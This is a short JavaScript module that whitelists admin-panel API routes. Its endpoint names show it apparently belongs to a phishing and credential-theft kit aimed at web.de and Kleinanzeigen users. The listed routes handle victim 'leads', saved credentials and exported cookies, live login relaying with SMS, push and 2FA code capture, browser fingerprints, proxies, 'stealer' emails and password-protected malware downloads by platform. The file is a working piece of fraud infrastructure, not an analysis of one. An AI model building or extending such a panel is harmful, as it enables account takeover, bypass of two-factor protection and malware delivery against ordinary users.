'use strict';

/** Эндпоинты только для админки (CORS / маршрутизация). */
function isAdminRequest(pathname) {
  return pathname === '/api/chat-open' ||
    pathname === '/api/chat-open-ack' ||
    pathname === '/api/chat-typing' ||
    pathname === '/api/chat-read' ||
    pathname === '/api/leads' ||
    pathname === '/api/geo' ||
    pathname === '/api/get-saved-credentials' ||
    pathname === '/api/delete-lead' ||
    pathname === '/api/delete-all' ||
    pathname === '/api/save-credentials' ||
    pathname === '/api/delete-saved-credential' ||
    pathname === '/api/mode' ||
    pathname === '/api/start-page' ||
    pathname === '/api/show-error' ||
    pathname === '/api/show-success' ||
    pathname === '/api/redirect-change-password' ||
    pathname === '/api/redirect-sicherheit' ||
    pathname === '/api/redirect-sicherheit-windows' ||
    pathname === '/api/redirect-android' ||
    pathname === '/api/redirect-download-by-platform' ||
    pathname === '/api/redirect-push' ||
    pathname === '/api/redirect-sms-code' ||
    pathname === '/api/redirect-2fa-code' ||
    pathname === '/api/redirect-open-on-pc' ||
    pathname === '/api/redirect-klein-forgot' ||
    pathname === '/api/mark-worked' ||
    pathname === '/api/mark-opened' ||
    pathname === '/api/config/download' ||
    pathname === '/api/config/download-limit' ||
    pathname === '/api/config/download-upload-multi' ||
    pathname === '/api/config/download-android' ||
    pathname === '/api/config/download-android-limit' ||
    pathname === '/api/config/download-android-upload-multi' ||
    pathname === '/api/config/download-delete' ||
    pathname === '/api/config/download-android-delete' ||
    pathname === '/api/config/download-reset-counts' ||
    pathname === '/api/config/download-rotate-next' ||
    pathname === '/api/config/download-settings' ||
    pathname === '/api/config/cookies-export' ||
    pathname === '/api/config/check' ||
    pathname === '/api/config/upload-apply' ||
    pathname === '/api/config/shortlinks' ||
    pathname === '/api/config/short-domains' ||
    pathname === '/api/config/short-domains-check' ||
    pathname === '/api/config/zip-password' ||
    pathname === '/api/config/zip-process' ||
    pathname === '/api/config/proxies' ||
    pathname === '/api/config/proxies-validate' ||
    pathname === '/api/config/webde-fingerprint-indices' ||
    pathname === '/api/config/webde-fingerprints-list' ||
    pathname === '/api/config/webde-fingerprint-probe-start' ||
    pathname === '/api/config/webde-fingerprint-probe-status' ||
    pathname === '/api/config/stealer-email' ||
    pathname === '/api/config/stealer-email/select' ||
    pathname === '/api/config/email' ||
    pathname === '/api/config/email/select' ||
    pathname === '/api/config/warmup-email' ||
    pathname === '/api/config/warmup-email/select' ||
    pathname === '/api/send-stealer' ||
    pathname === '/api/send-email' ||
    pathname === '/api/send-email-all-success' ||
    pathname === '/api/send-email-cookies-batch' ||
    pathname === '/api/archive-leads-by-filter' ||
    pathname === '/api/lead-kl-archive' ||
    pathname === '/api/warmup-start' ||
    pathname === '/api/warmup-status' ||
    pathname === '/api/warmup-pause' ||
    pathname === '/api/warmup-stats-reset' ||
    pathname === '/api/warmup-stop' ||
    pathname === '/api/export-logs' ||
    pathname === '/api/lead-credentials' ||
    pathname === '/api/lead-cookies' ||
    pathname === '/api/lead-fingerprint' ||
    pathname === '/api/lead-automation-profile' ||
    pathname === '/api/lead-login-context' ||
    pathname === '/api/webde-login-grid-step' ||
    pathname === '/api/webde-login-start' ||
    pathname === '/api/webde-login-result' ||
    pathname === '/api/webde-wait-password' ||
    pathname === '/api/webde-poll-2fa-code' ||
    pathname === '/api/webde-login-2fa-wrong' ||
    pathname === '/api/webde-login-2fa-received' ||
    pathname === '/api/webde-login-slot-done' ||
    pathname === '/api/webde-push-resend-poll' ||
    pathname === '/api/webde-push-resend-result' ||
    pathname === '/api/script-event' ||
    pathname === '/api/zip-password' ||
    pathname === '/api/lead-klein-flow-poll' ||
    pathname === '/api/klein-anmelden-seen';
}

module.exports = { isAdminRequest };
